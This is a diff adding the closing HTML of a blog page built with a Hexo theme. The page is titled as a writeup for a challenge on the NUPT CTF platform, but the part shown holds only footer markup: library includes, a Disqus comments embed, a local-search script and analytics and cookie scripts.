+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'https://findneo.github.io/171004NuptZonghe2WP/';
+          this.page.identifier = '171004NuptZonghe2WP/';
+          this.page.title = '南邮CTF平台综合题2writeup';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://findneo.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+  
+
+  
+  <script type="text/javascript" src="/js/src/js.cookie.js?v=5.1.4"></script>
+  <script type="text/javascript" src="/js/src/scroll-cookie.js?v=5.1.4"></script>
+
+
+  
+
+</body>
+</html>
